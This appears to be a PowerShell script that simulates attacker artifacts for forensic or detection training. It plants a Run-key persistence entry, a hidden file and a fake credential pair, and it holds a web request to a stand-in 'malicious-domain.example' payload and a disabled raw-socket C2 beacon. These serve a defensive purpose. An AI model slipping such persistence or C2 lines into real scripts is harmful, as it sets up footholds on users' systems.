
# Simulate Suspicious PowerShell Process
Start-Sleep -Seconds 30

# Simulate Malicious Payload in Memory
$maliciousPayload = "Simulated malicious payload"
Write-Output $maliciousPayload

# --- C2 Network Artifact Simulation (DISABLED) ---
# The following block has been commented out to avoid errors during execution.

<# 
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.WriteLine("Simulated C2 traffic")
$writer.Flush()
#>

# Simulate Registry Persistence
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "notepad.exe" -PropertyType String -Force

# Simulate Hidden File Creation
$hiddenFile = "$env:USERPROFILE\Documents\hidden.txt"
"Sensitive data here" | Out-File $hiddenFile
attrib +h $hiddenFile

# Simulate DLL Load Command
Start-Process "rundll32.exe" -ArgumentList "shell32.dll,Control_RunDLL"

# Simulate Suspicious Log Entry (as a string in memory)
$fakeLog = "Unauthorized login from suspicious IP"
Write-Output $fakeLog

# Simulate Credentials in Memory
$username = "admin"
$password = "Pa$$w0rd123"

# Simulate Command History
Invoke-WebRequest -Uri "http://malicious-domain.example/payload"
Get-Process | Where-Object { $_.CPU -gt 100 }

# Simulate Encoded Fileless Payload
$encodedPayload = "VwByAGkAdABlAC0ASABvAHMAdAAgACIAUgB1AG4AbgBpAG4AZwAgAHAAYQB5AGwAbwBhAGQALgAuAC4AIgA="
